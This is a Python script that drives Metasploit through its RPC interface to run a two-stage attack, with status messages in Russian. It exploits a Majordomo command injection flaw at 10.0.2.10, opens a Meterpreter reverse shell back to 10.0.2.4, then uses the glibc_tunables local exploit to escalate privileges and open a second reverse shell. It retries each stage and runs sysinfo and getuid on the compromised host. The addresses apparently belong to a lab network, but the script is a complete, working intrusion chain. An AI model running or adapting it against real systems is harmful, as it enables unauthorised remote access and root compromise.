from pymetasploit3.msfrpc import *
import subprocess
from subprocess import DEVNULL, STDOUT
import time
import sys

def run_with_output(module, payload=None):
    cid = client.consoles.console().cid
    out = client.consoles.console(cid).run_module_with_output(module, payload)
    client.consoles.destroy(cid)
    return out
    
subprocess.Popen(["msfrpcd", "-P", "123", "-n", "-f", "-a", "127.0.0.1"], stdout=DEVNULL, stderr=STDOUT)
print("Ожидание запуска msfrpcd...")
time.sleep(10)

client = MsfRpcClient("123", port=55553, ssl=True)
print("Подключено к серверу Metasploit RPC.")

exploit1 = client.modules.use('exploit', 'linux/http/majordomo_cmd_inject_cve_2023_50917')
exploit1['RHOSTS'] = '10.0.2.10'
exploit1['RPORT'] = 80

payload1 = client.modules.use('payload', 'cmd/linux/http/x64/meterpreter/reverse_tcp')
payload1['LHOST'] = '10.0.2.4'
payload1['LPORT'] = 4444

attempts = 3

for i in range(attempts):
    print(f"Попытка {i + 1} из {attempts} эксплуатации уязвимости Majordomo")
    if i >= 1:
        time.sleep(10)

    count = len(client.sessions.list)
    run_with_output(exploit1, payload1)

    if len(client.sessions.list) > count:
        print("Эксплуатация уязвимости прошла успешно.")
        break
else:
    print('Ошибка в процессе эксплуатации уязвимости')

if len(client.sessions.list) == 0:
    sys.exit()

session_id = list(client.sessions.list)[-1]

print(f'Метерпретер сессия была успешно создана с id {session_id}')

session = client.sessions.session(session_id)
session.write('sysinfo')
session.write('getuid')
time.sleep(5)
response = session.read()
print(response)


exploit2 = client.modules.use('exploit', 'linux/local/glibc_tunables_priv_esc')
exploit2['AutoCheck'] = False
exploit2['SESSION'] = int(session_id)

payload2 = client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
payload2['LHOST'] = '10.0.2.4'
payload2['LPORT'] = 5555

for i in range(attempts):
    print(f"Попытка {i + 1} из {attempts} эксплуатации уязвимости glibc_tunables_priv_esc")
    if i >= 1:
        time.sleep(25)

    count = len(client.sessions.list)
    run_with_output(exploit2, payload2)

    if len(client.sessions.list) > count:
        print("Эксплуатация уязвимости прошла успешно.")
        break
else:
    print('Ошибка в процессе эксплуатации уязвимости')

session_id = list(client.sessions.list)[-1]

print(f'Метерпретер сессия была успешно создана с id {session_id}')

session = client.sessions.session(session_id)
session.write('sysinfo')
session.write('getuid')
time.sleep(5)
response = session.read()
print(response)
time.sleep(5)

subprocess.Popen(["pkill", "msfrpcd"])
print("Остановлен msfrpcd.")
